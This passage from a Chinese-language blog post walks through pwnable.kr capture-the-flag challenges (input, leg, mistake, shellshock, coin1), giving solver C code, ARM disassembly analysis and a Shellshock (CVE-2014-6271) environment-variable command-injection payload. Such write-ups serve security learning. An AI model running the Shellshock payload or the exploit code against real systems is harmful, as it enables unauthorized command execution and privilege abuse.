+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">5</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sd, cd;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in saddr;
+</span></span><span style="display:flex;"><span>    sd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;socket error, tell admin</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    saddr.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    saddr.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>    saddr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#a6e22e">atoi</span>(args[<span style="color:#e6db74">&#39;C&#39;</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">connect</span>(sd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>saddr, <span style="color:#66d9ef">sizeof</span>(saddr))<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Error : Connect Failed </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(sd, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(sd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* parent process can close up output side of pipe, connect it to stdin and stderr,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     and then close the input side and call/home/input2/input */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipe_stdin[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipe_stderr[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(pipe_stdin[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(pipe_stderr[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipe_stdin[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipe_stderr[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/home/input2/input&#34;</span>, args, environ);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp -P <span style="color:#ae81ff">2222</span> ./1.c input2@pwnable.kr:/tmp/freeez
+</span></span><span style="display:flex;"><span>gcc ./1.c -o input-flag
+</span></span><span style="display:flex;"><span>ln -sf /home/input2/flag flag
+</span></span><span style="display:flex;"><span>./input-flag
+</span></span></code></pre></div><h2 id="08-leg">08. leg</h2>
+<blockquote>
+<p>Daddy told me I should study arm.
+But I prefer to study my leg!</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">key1</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;mov r3, pc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">key2</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">asm</span>(
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;push	{r6}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;add	r6, pc, $1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;bx	r6</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;.code   16</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;mov	r3, pc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;add	r3, $0x4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;push	{r3}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;pop	{pc}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;.code	32</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;pop	{r6}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">key3</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">asm</span>(<span style="color:#e6db74">&#34;mov r3, lr</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> key<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Daddy has very strong arm! : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>key);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( (<span style="color:#a6e22e">key1</span>()<span style="color:#f92672">+</span><span style="color:#a6e22e">key2</span>()<span style="color:#f92672">+</span><span style="color:#a6e22e">key3</span>()) <span style="color:#f92672">==</span> key ){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Congratz!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;flag&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> r <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(fd, buf, <span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">0</span>, buf, r);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;I have strong leg :P</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code>(gdb) disass main
+Dump of assembler code for function main:
+   0x00008d3c &lt;+0&gt;:	push	{r4, r11, lr}
+   0x00008d40 &lt;+4&gt;:	add	r11, sp, #8
+   0x00008d44 &lt;+8&gt;:	sub	sp, sp, #12
+   0x00008d48 &lt;+12&gt;:	mov	r3, #0
+   0x00008d4c &lt;+16&gt;:	str	r3, [r11, #-16]
+   0x00008d50 &lt;+20&gt;:	ldr	r0, [pc, #104]	; 0x8dc0 &lt;main+132&gt;
+   0x00008d54 &lt;+24&gt;:	bl	0xfb6c &lt;printf&gt;
+   0x00008d58 &lt;+28&gt;:	sub	r3, r11, #16
+   0x00008d5c &lt;+32&gt;:	ldr	r0, [pc, #96]	; 0x8dc4 &lt;main+136&gt;
+   0x00008d60 &lt;+36&gt;:	mov	r1, r3
+   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;
+   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;
+   0x00008d6c &lt;+48&gt;:	mov	r4, r0
+   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;
+   0x00008d74 &lt;+56&gt;:	mov	r3, r0
+   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3
+   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;
+   0x00008d80 &lt;+68&gt;:	mov	r3, r0
+   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3
+   0x00008d88 &lt;+76&gt;:	ldr	r3, [r11, #-16]
+   0x00008d8c &lt;+80&gt;:	cmp	r2, r3
+   0x00008d90 &lt;+84&gt;:	bne	0x8da8 &lt;main+108&gt;
+   0x00008d94 &lt;+88&gt;:	ldr	r0, [pc, #44]	; 0x8dc8 &lt;main+140&gt;
+   0x00008d98 &lt;+92&gt;:	bl	0x1050c &lt;puts&gt;
+   0x00008d9c &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x8dcc &lt;main+144&gt;
+   0x00008da0 &lt;+100&gt;:	bl	0xf89c &lt;system&gt;
+   0x00008da4 &lt;+104&gt;:	b	0x8db0 &lt;main+116&gt;
+   0x00008da8 &lt;+108&gt;:	ldr	r0, [pc, #32]	; 0x8dd0 &lt;main+148&gt;
+   0x00008dac &lt;+112&gt;:	bl	0x1050c &lt;puts&gt;
+   0x00008db0 &lt;+116&gt;:	mov	r3, #0
+   0x00008db4 &lt;+120&gt;:	mov	r0, r3
+   0x00008db8 &lt;+124&gt;:	sub	sp, r11, #8
+   0x00008dbc &lt;+128&gt;:	pop	{r4, r11, pc}
+   0x00008dc0 &lt;+132&gt;:	andeq	r10, r6, r12, lsl #9
+   0x00008dc4 &lt;+136&gt;:	andeq	r10, r6, r12, lsr #9
+   0x00008dc8 &lt;+140&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4b0
+   0x00008dcc &lt;+144&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4bc
+   0x00008dd0 &lt;+148&gt;:	andeq	r10, r6, r4, asr #9
+End of assembler dump.
+</code></pre><pre tabindex="0"><code>(gdb) disass key1
+Dump of assembler code for function key1:
+   0x00008cd4 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
+   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0
+   0x00008cdc &lt;+8&gt;:	mov	r3, pc
+   0x00008ce0 &lt;+12&gt;:	mov	r0, r3
+   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0
+   0x00008ce8 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
+   0x00008cec &lt;+24&gt;:	bx	lr
+End of assembler dump.
+</code></pre><p>返回值为r0,r0保存的是0x00008cdc处时的pc值，由于流水线处理，pc为进接的第二条指令的地址，pc=0x00008ce4，key1()=0x00008ce4</p>
+<pre tabindex="0"><code>(gdb) disass key2
+Dump of assembler code for function key2:
+   0x00008cf0 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
+   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0
+   0x00008cf8 &lt;+8&gt;:	push	{r6}		; (str r6, [sp, #-4]!)
+   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1
+   0x00008d00 &lt;+16&gt;:	bx	r6
+   0x00008d04 &lt;+20&gt;:	mov	r3, pc
+   0x00008d06 &lt;+22&gt;:	adds	r3, #4
+   0x00008d08 &lt;+24&gt;:	push	{r3}
+   0x00008d0a &lt;+26&gt;:	pop	{pc}
+   0x00008d0c &lt;+28&gt;:	pop	{r6}		; (ldr r6, [sp], #4)
+   0x00008d10 &lt;+32&gt;:	mov	r0, r3
+   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0
+   0x00008d18 &lt;+40&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
+   0x00008d1c &lt;+44&gt;:	bx	lr
+End of assembler dump.
+</code></pre><p>同key1,r0保存的是r3+#4，而r3是0X00008d04时的pc值，pc=0x00008d08,所以key2=0x00008d08+4=0x00008d0c</p>
+<pre tabindex="0"><code>(gdb) disass key3
+Dump of assembler code for function key3:
+   0x00008d20 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
+   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0
+   0x00008d28 &lt;+8&gt;:	mov	r3, lr
+   0x00008d2c &lt;+12&gt;:	mov	r0, r3
+   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0
+   0x00008d34 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
+   0x00008d38 &lt;+24&gt;:	bx	lr
+End of assembler dump.
+</code></pre><p>r0的值是lr的值，而lr是子函数返回位置的地址，在main函数中可以看到为0x00008d80
+所以key = 0x00008d80+0x00008d0c+0x00008ce4=108400</p>
+<h2 id="09-mistake">09. mistake</h2>
+<blockquote>
+<p>We all make mistakes, let&rsquo;s move on.
+(don&rsquo;t take this too seriously, no fancy hacking skill is required at all)</p>
+<p>This task is based on real event
+Thanks to dhmonkey</p>
+<p>hint : operator priority</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PW_LEN 10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define XORKEY 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">xor</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> s, <span style="color:#66d9ef">int</span> len){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>len; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>                s[i] <span style="color:#f92672">^=</span> XORKEY;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(fd<span style="color:#f92672">=</span><span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/home/mistake/password&#34;</span>,O_RDONLY,<span style="color:#ae81ff">0400</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;can&#39;t open password %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fd);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;do not bruteforce...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> pw_buf[PW_LEN<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> len;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>(len<span style="color:#f92672">=</span><span style="color:#a6e22e">read</span>(fd,pw_buf,PW_LEN) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;read error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> pw_buf2[PW_LEN<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;input password : &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%10s&#34;</span>, pw_buf2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xor your input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">xor</span>(pw_buf2, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(pw_buf, pw_buf2, PW_LEN)){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Password OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Wrong Password</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在<code> if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>中，大小判断的优先级大于赋值的优先级，先比较后赋值，也就是说这行内容实际等价于<code> fd=0</code>，在后面的read函数不会从password文件读取内容，反而会从用户的输入中读取。所以首先输入十个0，再输入十个1，即可得到flag</p>
+<h2 id="10-shellshock">10. shellshock</h2>
+<blockquote>
+<p>Mommy, there was a shocking news about bash.
+I bet you already know, but lets just make it sure :)</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setresuid</span>(<span style="color:#a6e22e">getegid</span>(), <span style="color:#a6e22e">getegid</span>(), <span style="color:#a6e22e">getegid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setresgid</span>(<span style="color:#a6e22e">getegid</span>(), <span style="color:#a6e22e">getegid</span>(), <span style="color:#a6e22e">getegid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>本题来自漏洞CVE-2014-6271</p>
+<p><a href="https://www.antiy.com/response/CVE-2014-6271.html">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
+<blockquote>
+<p><strong>六、</strong>   <strong>漏洞原理</strong></p>
+<p>目前的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p>
+<p>在补丁中主要进行了参数的合法性过滤，补丁程序在/builtins/evalstring.c的parse_and_execute函数中进行了输入的command进行了合法性的边界检测，将代码注入的可能性排除。在排除中主要用到了flags的两次判断和command的一次类型匹配，为了能够flags判断准确，在补丁中预先定义了SEVAL_FUNCDEF、SEVAL_ONECMD两个标识作为判断依据。</p>
+<p>此漏洞进行的补丁更新有三处，主要进行输入的command进行过滤作用。</p>
+<p>/builtins/common.h</p>
+<p>#define SEVAL_FUNCDEF 0x080     /* only allow function definitions <em>/ #define SEVAL_ONECMD 0x100     /</em> only allow a single command */</p>
+<p>/builtins/evalstring.c</p>
+<p>​      if ((flags &amp; SEVAL_FUNCDEF) &amp;&amp; command-&gt;type != cm_function_def)     {      internal_warning (&quot;%s: ignoring function definition attempt&quot;, from_file);      should_jump_to_top_level = 0;      last_result = last_command_exit_value = EX_BADUSAGE;      break;     }</p>
+<p>/builtins/evalstring.c</p>
+<p>if (flags &amp; SEVAL_ONECMD)     break;</p>
+<p>从阐述的漏洞原理可知，漏洞的根本原因存在于bash的ENV命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果达到远程代码执行的目的，必须要借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。例如，第三方服务程序apache2便可充当此媒介，其CGI组件满足远程访问并调用bash的ENV命令进行访问数据解析功能。具体如何实现，见下面的原理图：CVE-2014-6271漏洞实现远程代码执行原理图。</p>
+<p>······</p>
+<ol>
+<li><strong>本地验证方法：</strong></li>
+</ol>
+<p><strong>在shell中执行下面命令：</strong></p>
+<p><strong>env x=&rsquo;() { :;}; echo Vulnerable CVE-2014-6271 &rsquo; bash -c &ldquo;echo test&rdquo;</strong></p>
+<p><strong>执行命令后，如果显示Vulnerable CVE-2014-6271，证系统存在漏洞，可改变echo Vulnerable CVE-2014-6271为任意命令进行执行。</strong></p>
+</blockquote>
+<p>所以<code>env x='() { :;}; echo /bin/cat flag ' bash -c &quot;echo test&quot;</code>即可</p>
+<h2 id="11-coin1">11. coin1</h2>
+<blockquote>
+<p>Mommy, I wanna play a game!
+(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</p>
+</blockquote>
+<pre tabindex="0"><code>root@Lenovo:~/pwnable# nc pwnable.kr 9007
+
+        ---------------------------------------------------
+        -              Shall we play a game?              -
+        ---------------------------------------------------
+
+        You have given some gold coins in your hand
+        however, there is one counterfeit coin among them
+        counterfeit coin looks exactly same as real coin
+        however, its weight is different from real one
+        real coin weighs 10, counterfeit coin weighes 9
+        help me to find the counterfeit coin with a scale
+        if you find 100 counterfeit coins, you will get reward :)
+        FYI, you have 60 seconds.
+
+        - How to play - 
+        1. you get a number of coins (N) and number of chances (C)
+        2. then you specify a set of index numbers of coins to be weighed
+        3. you get the weight information
+        4. 2~3 repeats C time, then you give the answer
+
+        - Example -
+        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
+        [Client] 0 1            # weigh first and second coin
+        [Server] 20                     # scale result : 20
+        [Client] 3                      # weigh fourth coin
+        [Server] 10                     # scale result : 10
+        [Client] 2                      # counterfeit coin is third!
+        [Server] Correct!
+
+        - Ready? stting in 3 sec... -
+
+N=895 C=10
+</code></pre><p>根据题意，真金币的重量是10，假金币的重量是9，二分法查找假硬币的index即可</p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
